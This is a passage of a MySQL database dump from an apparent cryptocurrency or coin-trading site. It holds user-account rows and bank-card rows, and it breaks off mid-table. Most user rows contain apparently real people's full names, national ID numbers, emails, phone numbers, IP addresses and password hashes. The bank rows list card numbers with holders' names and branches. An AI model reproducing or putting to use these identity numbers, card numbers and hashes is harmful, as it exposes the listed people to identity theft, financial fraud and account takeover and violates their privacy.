INSERT INTO `movesay_user` VALUES ('5110', 'xwj312640', '', '0', 'e714a90f4f45c94e02c37de6e1b2d7fb', '1', '73db657f91cbe0a12ce05b7bab9bcb0e', '0', '0', '0', '谢文军', '362532198910080416', '0', '', '118.212.200.76', '未分配或者内网IP', '0', '1517846281', '0', '1', '657293099@126.com', null, 'VMSUPK', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5111', 'z15170570067', '', '0', '796f08b55099ad645ab352ed19b79d6d', '1', '', '0', '0', '0', '', '', '0', '', '211.141.83.125', '未分配或者内网IP', '0', '1518093786', '0', '1', null, null, 'IQHXDW', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5112', 'shishunli', '', '0', 'c467a3e4072f07f0ade743b137387e55', '1', '', '0', '0', '0', '', '', '0', '', '1.80.123.252', '未分配或者内网IP', '0', '1518264825', '0', '1', null, null, 'ZPXLHY', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5113', 'shishunli744', '', '0', '0070e3644e4cc65e62ae649a87801548', '1', '1f4c9f81f2df5e01ea05d14259a02d77', '0', '0', '0', '', '', '0', '', '49.221.62.114', '未分配或者内网IP', '0', '1518264865', '0', '1', null, null, 'CAKBGX', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5114', 'shunli', '', '0', '0070e3644e4cc65e62ae649a87801548', '1', '1f4c9f81f2df5e01ea05d14259a02d77', '0', '0', '0', '史顺利', '620502199909133814', '0', '', '49.221.62.114', '未分配或者内网IP', '0', '1518265113', '0', '1', '1941007248@qq.com', null, 'GZNXJK', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5115', 'ltz88818', '', '0', '4297f44b13955235245b2497399d7a93', '1', '', '0', '0', '0', '', '', '0', '', '49.72.114.131', '未分配或者内网IP', '0', '1518358415', '0', '1', null, null, 'KJARFM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5116', '   zhizhenjushi', '', '0', '9b6063d4089aff2c82fea11c1067b69b', '1', '84ccb6e9ad28ad3d52fdfa587ae4339b', '0', '0', '0', '陈雷', '411528198806103736', '0', '', '61.129.6.147', '未分配或者内网IP', '0', '1518624789', '0', '1', '18953973238@163.co', null, 'BISKPD', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5117', 'a44180', '', '0', '7a8ba9ecc43975e804b679d7fde5ddd7', '1', '4c698b345ef515a6dc0966b1a1fd1263', '0', '0', '0', '谢金平', '441801198810082677', '0', '', '14.16.37.229', '未分配或者内网IP', '0', '1518716511', '0', '1', 'a986630b@163.com', null, 'GRNXWP', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5118', 'a441801', '', '0', '7a8ba9ecc43975e804b679d7fde5ddd7', '1', '4c698b345ef515a6dc0966b1a1fd1263', '0', '0', '0', '谢金平', '441801198810082677', '0', '', '183.40.150.93', '未分配或者内网IP', '0', '1519139385', '0', '1', 'a986630b@163.com', null, 'RDVEWU', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5119', 'xxd15838097766', '', '0', 'ba4c83fbb39c124ee0f95926c519b0f5', '1', '773f1990d5561b94bcf449dd58db883a', '0', '0', '0', '盛玲玲', '420921198210074442', '0', '', '120.219.174.158', '未分配或者内网IP', '0', '1519174221', '0', '1', '347352109@qq.com', null, 'HBRSXV', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5120', 'zwg9677', '', '0', '31a8dac463f7e296b896b7de8d8ad705', '1', '3ed6f89ec4fc8912c8ab590f94e7bf15', '0', '0', '0', '张卫国', '321321197608302417', '0', '', '36.149.107.225', '未分配或者内网IP', '0', '1519365343', '0', '1', '13611549677@163.co', null, 'TKPIRW', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5121', 'zwg549677', '13611549677', '1519366603', '31a8dac463f7e296b896b7de8d8ad705', '1', '3ed6f89ec4fc8912c8ab590f94e7bf15', '0', '0', '0', '张卫国', '321321197608302417', '0', '', '223.104.147.248', '未分配或者内网IP', '0', '1519366314', '0', '1', '13611549677@163.co', '13611549677', 'KAENTM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5122', 'qwer112215', '', '0', '8139696ed567b4e69c5819f3438a9f09', '1', '7980020432962e250c251ebfe5ed39d5', '0', '0', '0', '浦大良', '320924198309247492', '0', '', '223.104.147.81', '未分配或者内网IP', '0', '1519454720', '0', '1', '594015472@qq.com', null, 'XEKATV', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5123', 'wgq729', '', '0', '002772406c000396fd4704af816b075f', '1', '8ddcff3a80f4189ca1c9d4d902c3c909', '0', '0', '0', '吴国桥', '330681198007299310', '0', '', '60.190.224.180', '未分配或者内网IP', '0', '1519458616', '0', '1', 'wgq729@sina.com.cn', null, 'EQXVHN', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5124', 'xy00011', '', '0', '983d511534abdcbfc3b457c24f8cb1f2', '1', '4e77c9735766e4ee67ca46403e8a43b4', '0', '0', '0', '熊艳', '429005198702072661', '0', '', '220.113.122.66', '未分配或者内网IP', '0', '1519524611', '0', '1', '1097923276@qq.com', null, 'JBKLXH', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5125', 'maryk123', '', '0', 'dc483e80a7a0bd9ef71d8cf973673924', '1', '', '0', '0', '0', '', '', '0', '', '42.114.193.45', '未分配或者内网IP', '0', '1519957053', '0', '1', null, null, 'IRHQCK', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5126', 'y135246135', '', '0', 'f0e7fe7ae7df736450ddb413918e65c5', '1', '78889d4bf053c83a7d5c60c6ee37de8c', '0', '0', '0', '', '', '0', '', '182.126.226.12', '未分配或者内网IP', '0', '1520393269', '0', '1', null, null, 'UNHEVR', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5127', 'y15993193229', '', '0', 'f0e7fe7ae7df736450ddb413918e65c5', '1', '', '0', '0', '0', '', '', '0', '', '182.126.226.12', '未分配或者内网IP', '0', '1520393760', '0', '1', null, null, 'PUGCVL', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5128', 'cc05620', '', '0', 'e7e2f7e003e0234af7873c4a1ad31adb', '1', 'e3ceb5881a0a1fdaad01296d7554868d', '0', '0', '0', '', '', '0', '', '14.153.187.226', '未分配或者内网IP', '0', '1520416643', '0', '1', null, null, 'IRXAVM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5129', 'Aaa830825', '', '0', '51d89ae91ff1a3360e70cb0489a797ad', '1', 'ccd904f24b30c69e5ddb008c1c0b3313', '0', '0', '0', '', '', '0', '', '112.97.193.22', '未分配或者内网IP', '0', '1520443477', '0', '1', null, null, 'YKLGCM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5130', 'FWJ888', '', '0', '694b0940c4e44388dcd384220783cb3e', '1', '620573866f3bd65594678a69e6498247', '0', '0', '0', '傅文杰', '352627198011094112', '0', '', '27.158.188.206', '未分配或者内网IP', '0', '1520515159', '0', '1', '283896968@qq.com', null, 'DTBHIC', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5131', 'xqp123456', '15857136021', '1520554721', '5c18216aeb19c1a79f821902d846067b', '1', '7f66ed1b039d2da0049a7dda145b89bb', '0', '0', '0', '肖乾坡', '430528198204193052', '1', '', '211.138.116.165', '未分配或者内网IP', '0', '1520549283', '0', '1', '44842684@qq.com', null, 'BWVRLF', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5132', 'cxb411', '18396378717', '1520596980', '8a474a32c360dbc1d7e52a7d36e8bca0', '1', 'ac548aaa5f9b4ff0a2be03037fb7110a', '0', '0', '0', '陈晓斌', '35082119901216275X', '0', '', '120.43.87.190', '未分配或者内网IP', '0', '1520596366', '0', '1', '510869916@qq.com', null, 'DEXQBS', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5133', 'CTX281OK', '', '0', 'bd1db19e51b47f9d3b7545b6d7188abe', '1', '1b016371a6906e28a9b251f02bcf2053', '0', '0', '0', '', '', '0', '', '175.164.23.173', '未分配或者内网IP', '0', '1520613845', '0', '1', null, null, 'KNXVLC', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5134', 'James5478690', '', '0', '153e2db47672d0f753e8a3fe8484347b', '1', '0192023a7bbd73250516f069df18b500', '0', '0', '0', '李超毅', '420324198007120550', '0', '', '116.7.64.126', '未分配或者内网IP', '0', '1520658754', '0', '1', ' 1139762945@qq.com', null, 'NSBITM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5135', 'LUOCHENG123', '', '0', 'a6794860ce420b7dfeb28b175d1d6351', '1', '216c629e8c87bb8d1617440b93980c04', '0', '0', '0', '肖叶城', '421023199702083459', '0', '', '117.181.42.65', '未分配或者内网IP', '0', '1520674223', '0', '1', '1797854598@qq.com', null, 'YKRUVI', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5136', 'zyl2343', '18734782343', '1520779706', '67b197069d2a2f014e96083f6a43b84a', '1', '15cef5b0ed5c370e634ea6fbcba26cb1', '0', '0', '0', '张永丽', '142601197103136562', '1', '', '118.73.44.193', '未分配或者内网IP', '0', '1520779452', '0', '1', '1738190373@qq.com', null, 'FRAQHZ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5137', 'hl950920', '', '0', '1d0f5c01e270fd2b04712bed954f6c72', '1', 'af0a87f4029b6b570f0e4730586fcb01', '0', '0', '0', '', '', '0', '', '1.80.37.151', '未分配或者内网IP', '0', '1520849521', '0', '1', null, null, 'DCLGPA', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5138', 'w199016', '', '0', '974c14762366e0f3fa89f1912ed9fb2b', '1', 'ee198a825589d6f76d743c9aecf4b5b8', '0', '0', '0', '', '', '0', '', '175.167.144.83', '未分配或者内网IP', '0', '1520930728', '0', '1', null, null, 'YUVJKM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5139', 'b00079479', '', '0', '0062d21c1a97acad0fff653df56849b2', '1', '9f0013b83032e9d7bbee3f0d48f17dab', '0', '0', '0', '', '', '0', '', '222.77.251.143', '未分配或者内网IP', '0', '1521102526', '0', '1', null, null, 'SVNWHR', null, 'CN');
INSERT INTO `movesay_user` VALUES ('1', 'wave123', '', '0', '0062d21c1a97acad0fff653df56849b2', '1', '9f0013b83032e9d7bbee3f0d48f17dab', '0', '0', '0', '', '', '0', '', '222.77.251.143', '未分配或者内网IP', '0', '1521102526', '0', '1', '947142188@qq.com', '', 'SVNWHR', '', 'CN');
INSERT INTO `movesay_user` VALUES ('5140', '123456789@qq.com', '', '0', 'e10adc3949ba59abbe56e057f20f883e', '1', '', '0', '0', '0', '', '', '0', '', '127.0.0.1', '未分配或者内网IP', '0', '1521533113', '0', '1', '123456789@qq.com', null, 'NMRDTH', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5141', 'test123456789', '', '0', 'e10adc3949ba59abbe56e057f20f883e', '1', '25d55ad283aa400af464c76d713c07ad', '0', '0', '0', '张永丽', '142601197103136562', '0', '', '127.0.0.1', '未分配或者内网IP', '0', '1521534652', '0', '1', '123465@qq.com', null, 'CXRHWJ', null, null);

-- ----------------------------
-- Table structure for movesay_user_bank
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user_bank`;
CREATE TABLE `movesay_user_bank` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `name` varchar(200) NOT NULL,
  `bank` varchar(200) NOT NULL,
  `bankprov` varchar(200) NOT NULL,
  `bankcity` varchar(200) NOT NULL,
  `bankaddr` varchar(200) NOT NULL,
  `bankcard` varchar(200) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM AUTO_INCREMENT=2639 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_user_bank
-- ----------------------------
INSERT INTO `movesay_user_bank` VALUES ('2556', '4887', '王晶', '招商银行', '广东', '深圳', '新时代广场支行', '6225886554692499', '0', '1505280996', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2557', '4888', 'zz001', '农业银行', '安徽', '黄山', '安徽省黄山市歙县开发区分理处', '6230522000000379871', '0', '1505355573', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2596', '4954', '卡1', '建设银行', '广西', '崇左', '扶绥县支行', '6214673370001725153', '0', '1505437441', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2559', '4894', '广东省深圳市罗湖区东门', '工商银行', '广东', '深圳', '深圳市罗湖区东门支行', '6212264000037088768', '0', '1505378866', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2560', '4896', '中国建设银行', '建设银行', '陕西', '西安', '高新区支行', '6210814220004516778', '0', '1505379269', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2561', '4899', '刘会勤', '农业银行', '河南', '平顶山', '舞钢市支行', '6228482062097652810', '0', '1505380348', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2562', '4904', '农业银行丁', '农业银行', '江苏', '无锡', '江苏无锡东门支行', '6228480438336048170', '0', '1505380628', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2563', '4903', ' 中国农业银行', '农业银行', '天津', '北辰区', '宜兴阜支行', '6228480028383177079', '0', '1505380787', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2564', '4906', '吴峰林', '招商银行', '浙江', '衢州', '江山支行', '6214855700494145', '0', '1505381511', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2565', '4908', '文姐', '工商银行', '广东', '佛山', '南海区里水支行', '6212262013017318602', '0', '1505381919', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2566', '4909', '中国建设银行', '建设银行', '内蒙古', '呼伦贝尔', '牙克石支行', '6236680430000840', '0', '1505382006', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2567', '4891', '交易1', '中国银行', '河南', '三门峡', '舒馨苑支行', '6217868000001134076', '0', '1505382010', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2568', '4912', '谢智慧', '建设银行', '安徽', '芜湖', '利民路支行', '6217001650005134890', '0', '1505382577', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2569', '4911', '交易1', '建设银行', '河南', '三门峡', '湖滨区财政大厅支行', '6227002540130286152', '0', '1505382985', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2570', '4913', '朱红', '建设银行', '安徽', '芜湖', '利民路支行', '6236681650000012817', '0', '1505383281', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2571', '4910', '中国邮政银行', '邮政银行', '内蒙古', '呼伦贝尔', '牙克石市支行', '6217991910052872665', '0', '1505383510', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2572', '4914', '工商银行', '工商银行', '广东', '东莞', '南城支行', '6212262010013665283', '0', '1505384056', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2573', '4915', '甄宪锋', '建设银行', '河南', '新乡', '长垣支行', '6227002503720409519', '0', '1505385129', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2574', '4916', '钱包', '农业银行', '山东', '潍坊', '高密市民营科技园分理处', '6228480291983404018', '0', '1505385421', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2575', '4920', '高奎', '工商银行', '河南', '新乡', '长垣支行', '6212261704006989947', '0', '1505386524', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2576', '4917', '宋妨', '工商银行', '河南', '新乡', '长垣支行', '6222021704003930621', '0', '1505387256', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2577', '4892', '中国银行', '中国银行', '河南', '平顶山', '舞钢市支行', '6217858000070193369', '0', '1505394308', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2578', '4923', '交易1', '中国银行', '河南', '三门峡', '三门峡分营业部', '6210812540003137207', '0', '1505394626', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2579', '4929', '交易1', '建设银行', '河南', '三门峡', '黄河路支行', '6210812540002709469', '0', '1505395014', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2580', '4930', '交易1', '农业银行', '河南', '南阳', '南召县支行', '6228480979525626276', '0', '1505395629', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2581', '4931', '中国农业银行', '农业银行', '广东', '东莞', '桑园支行', '6228480609069591277', '0', '1505396163', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2582', '4932', '交易1', '中国银行', '河南', '三门峡', '陕州支行', '6216608000002005033', '0', '1505396515', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2583', '4933', '中国农业银行', '农业银行', '河南', '南阳', '方城县卧龙支行', '6228480978334739973', '0', '1505396534', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2584', '4935', '刘玉梅', '建设银行', '山东', '济南', '济西支行', '6217002340025377054', '0', '1505401441', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2585', '4939', '农行', '农业银行', '重庆', '壁山县', '青杠支行', '6228480471029245910', '0', '1505406695', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2587', '4941', '陈静', '农业银行', '湖南', '长沙', '华夏路支行', '6230521090000197275', '0', '1505413142', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2589', '4944', '谭元良', '中国银行', '四川', '乐山', '高新支行', '6217903100017192634', '0', '1505415332', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2590', '4945', '伍培文', '中国银行', '广东', '深圳', '福建大厦支行', '6217852000012186378', '0', '1505415662', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2591', '4946', '刘海深', '工商银行', '湖南', '长沙', '五一路支行', '6212261901009046317', '0', '1505416102', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2592', '4947', '廖阳秀', '交通银行', '湖南', '长沙', '星沙支行', '6222620640012844673', '0', '1505416563', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2593', '4951', '建设银行', '建设银行', '安徽', '芜湖', '繁昌支行', '6227001655510032421', '0', '1505432074', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2594', '4890', '河南省信阳市', '建设银行', '河南', '信阳', '南京路建设支银', '4340612580112574', '0', '1505432352', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2595', '4889', '刘', '建设银行', '安徽', '黄山', '歙县支行', '6222801711201002372', '0', '1505435342', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2597', '4957', '中国建设银行', '建设银行', '山东', '济南', '平阴支行老城分理处', '6217002340010696237', '0', '1505438757', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2598', '4964', 'rzh', '工商银行', '江苏', '连云港', '灌云县南京路支行', '6222021107008593503', '0', '1505446997', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2599', '4966', 'zm', '民生银行', '浙江', '杭州', '下沙支行', '6226227725851933', '0', '1505447845', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2600', '4967', '成响亮', '建设银行', '上海', '闵行区', '龙茗路支行', '6217001210012774939', '0', '1505448020', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2601', '4971', '中国农业银行', '农业银行', '河南', '南阳', '云阳支行', '6228480978336725673', '0', '1505452088', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2602', '4973', '中国农业银行', '农业银行', '湖北', '武汉', '南湖支行', '6228270051519854977', '0', '1505452550', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2603', '4974', '中国农业银行', '农业银行', '安徽', '蚌埠', '桥北分理处', '6228480678908346177', '0', '1505453097', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2604', '4975', 'tjr', '建设银行', '广西', '北海', '四川路支行', '6230943410000035400', '0', '1505453984', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2605', '4980', '吕小芳', '农业银行', '安徽', '芜湖', '开发区支行', '6228481999199051873', '0', '1505454936', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2606', '4982', '13878993682', '建设银行', '广西', '北海', '建设银行广西北海分行北部湾东路支行', '6217003410000312100', '0', '1505456584', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2607', '4984', '银行', '建设银行', '河南', '平顶山', '河南省平顶山市舞钢市寺坡支行', '6217002440002792455', '0', '1505456919', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2608', '4996', '张才芬', '农业银行', '江苏', '常州', '漕桥支行', '6228480415796144574', '0', '1505457966', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2609', '4993', '徐国英', '农业银行', '江苏', '常州', '武进支行', '6228480414580904913', '0', '1505458810', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2610', '4997', '星瀚', '农业银行', '安徽', '黄山', '歙县紫阳分行', '6228412000167193112', '0', '1505459317', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2611', '4949', '张永坡', '建设银行', '河南', '平顶山', '湛河区支行', '6210812440001902688', '0', '1505459402', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2612', '5002', '中国银行', '中国银行', '河南', '平顶山', '舞钢市支行', '622848', '0', '1505459606', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2613', '5003', '交易1', '建设银行', '河南', '平顶山', '舞钢支行', '6217002440004779005', '0', '1505459737', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2614', '5005', '15977099899', '工商银行', '广西', '桂林', '工商银行广西桂林市阳朔县支行', '6222032103000830925', '0', '1505459958', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2615', '5001', '15978004308', '邮政银行', '广西', '桂林', '邮政银行广西桂林市阳朔县支行', '6217996170002341031', '0', '1505460333', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2616', '5009', '管伟庆', '农业银行', '江苏', '常州', '礼嘉支行', '6228480419661997678', '0', '1505460512', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2617', '5010', '18778307403', '工商银行', '广西', '桂林', '工商银行广西桂林市荔浦县支行', '6217222103000806453', '0', '1505461131', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2618', '4998', '001', '农业银行', '浙江', '金华', '兰溪市支行', '6228430389028010211', '0', '1505462276', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2619', '5014', '田华伟', '农业银行', '河南', '平顶山', '舞钢市支行', '6228482060803083213', '0', '1505463276', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2620', '5011', '黑龙江省大兴安岭呼中区', '工商银行', '黑龙江', '大兴安岭', '呼中工行', '9558820914000174886', '0', '1505464327', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2621', '5021', '李树山建行', '建设银行', '安徽', '滁州', '中国建设银行天长支行', '6217001720008572410', '0', '1505472264', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2622', '5000', '妹妹', '建设银行', '湖北', '荆州', '花台支行', '6217002660011320820', '0', '1505478633', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2623', '5031', 'wjb', '交通银行', '广西', '百色', '右江支行', '6222624570000422578', '0', '1505487915', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2624', '5029', '中国农业银行江苏省兴化市戴窖支行', '农业银行', '江苏', '泰州', '兴化市戴窖支行', '6228483422808818010', '0', '1505487970', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2625', '5035', '交易1', '中国银行', '河南', '南阳', '云阳支行', '6217858000050289682', '0', '1505488363', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2626', '5038', '交易1', '工商银行', '河南', '焦作', '博爱支行', '6212261709000079611', '0', '1505488851', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2627', '5039', '交易1', '农业银行', '河南', '南阳', '云阳支行', '6228480979438546371', '0', '1505489261', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2628', '5043', '4545', '平安银行', '北京', '西城区', '1212', '121212121212121212', '0', '1506054194', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2629', '5045', '1678', '平安银行', '广东', '深圳', '平安银行', '6230580000013065672', '0', '1506321470', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2630', '5048', '156897', '平安银行', '广东', '深圳', '平安银行', '6230580000013065672', '0', '1506322850', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2631', '5050', '深圳福田上沙', '平安银行', '广东', '深圳', '平安银行', '623058', '0', '1506474461', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2632', '5052', '陈岩昆', '农业银行', '广东', '东莞', '南城支行', '6228480608565381779', '0', '1506509104', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2633', '5051', '单希', '平安银行', '北京', '东城区', '东城支行', '111111', '0', '1506511074', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2634', '5070', 'BAL', '工商银行', '广西', '百色', '田东县支行', '9558802110111043399', '0', '1513500031', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2635', '5071', 'BAL', '工商银行', '广西', '百色', '田东县支行', '9558802110111043399', '0', '1513560529', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2636', '5105', '1', '浦发银行', '北京', '东城区', '在有雪', '456789654333', '0', '1516953804', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2637', '5121', '1卡', '建设银行', '江苏', '宿迁', '宿城区支行', '6217001340002518820', '0', '1519366805', '0', '1');
INSERT INTO `movesay_user_bank` VALUES ('2638', '5058', '东方雨虹', '平安银行', '广东', '深圳', '深圳福田支行', '123456789123456', '0', '1521188342', '0', '1');

-- ----------------------------
-- Table structure for movesay_user_bank_type
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user_bank_type`;
CREATE TABLE `movesay_user_bank_type` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(200) NOT NULL,
  `title` varchar(200) NOT NULL,
  `url` varchar(200) NOT NULL,
  `img` varchar(200) NOT NULL,
  `mytx` varchar(200) NOT NULL,
  `remark` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=22 DEFAULT CHARSET=utf8 COMMENT='常用银行地址';

-- ----------------------------
-- Records of movesay_user_bank_type
-- ----------------------------
INSERT INTO `movesay_user_bank_type` VALUES ('4', 'boc', '中国银行', 'http://www.boc.cn/', 'img_56937003683ce.jpg', '', '', '0', '1452503043', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('5', 'abc', '农业银行', 'http://www.abchina.com/cn/', 'img_569370458b18d.jpg', '', '', '0', '1452503109', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('6', 'bccb', '北京银行', 'http://www.bankofbeijing.com.cn/', 'img_569370588dcdc.jpg', '', '', '0', '1452503128', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('8', 'ccb', '建设银行', 'http://www.ccb.com/', 'img_5693709bbd20f.jpg', '', '', '0', '1452503195', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('9', 'ceb', '光大银行', 'http://www.bankofbeijing.com.cn/', 'img_569370b207cc8.jpg', '', '', '0', '1452503218', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('10', 'cib', '兴业银行', 'http://www.cib.com.cn/cn/index.html', 'img_569370d29bf59.jpg', '', '', '0', '1452503250', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('11', 'citic', '中信银行', 'http://www.ecitic.com/', 'img_569370fb7a1b3.jpg', '', '', '0', '1452503291', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('12', 'cmb', '招商银行', 'http://www.cmbchina.com/', 'img_5693710a9ac9c.jpg', '', '', '0', '1452503306', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('13', 'cmbc', '民生银行', 'http://www.cmbchina.com/', 'img_5693711f97a9d.jpg', '', '', '0', '1452503327', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('14', 'comm', '交通银行', 'http://www.bankcomm.com/BankCommSite/default.shtml', 'img_5693713076351.jpg', '', '', '0', '1452503344', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('16', 'gdb', '广发银行', 'http://www.cgbchina.com.cn/', 'img_56937154bebc5.jpg', '', '', '0', '1452503380', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('17', 'icbc', '工商银行', 'http://www.icbc.com.cn/icbc/', 'img_56937162db7f5.jpg', '', '', '0', '1452503394', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('19', 'psbc', '邮政银行', 'http://www.psbc.com/portal/zh_CN/index.html', 'img_5693717eefaa3.jpg', '', '', '0', '1452503422', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('20', 'spdb', '浦发银行', 'http://www.spdb.com.cn/chpage/c1/', 'img_5693718f1d70e.jpg', '', '', '0', '1452503439', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('21', 'szpab', '平安银行', 'http://bank.pingan.com/', '56c2e4c9aff85.jpg', '', '', '0', '1455613129', '0', '1');

-- ----------------------------
-- Table structure for movesay_user_coin
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user_coin`;
CREATE TABLE `movesay_user_coin` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(10) unsigned NOT NULL,
  `sgc` decimal(20,8) unsigned NOT NULL,
  `sgcd` decimal(20,8) unsigned NOT NULL,
  `sgcb` varchar(200) NOT NULL,
  `cny` decimal(20,8) unsigned NOT NULL,
  `cnyd` decimal(20,8) unsigned NOT NULL,
  `cnyb` varchar(200) NOT NULL,
